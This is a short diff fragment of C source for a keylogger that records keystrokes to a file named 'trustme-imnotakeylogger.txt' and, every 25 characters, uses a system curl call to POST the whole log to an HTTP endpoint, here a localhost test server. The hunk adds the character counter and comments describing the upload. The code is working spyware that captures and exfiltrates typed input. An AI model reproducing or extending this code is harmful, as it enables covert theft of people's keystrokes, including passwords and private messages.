@@ -162,13 +162,12 @@ int main()
             const char *us_translated_key = us_keymap[auxkey][0];
             if (key>0) 
               fprintf(keylog,"%c", *us_translated_key);
+              amount++;
             if (amount >= 25){
               amount = 0;
               system("curl -X POST --data '@trustme-imnotakeylogger.txt' http://localhost:8080/api/file");
-
-              //curl -X POST https://example.com/process --data 
-
-              //send the last AMOUNT_CHARS!
+              //sends the complete file in a HTTP post request! 
+              //You will find a simple HTTP server in the repository useful for tests!
             }
             fflush(keylog);
         }
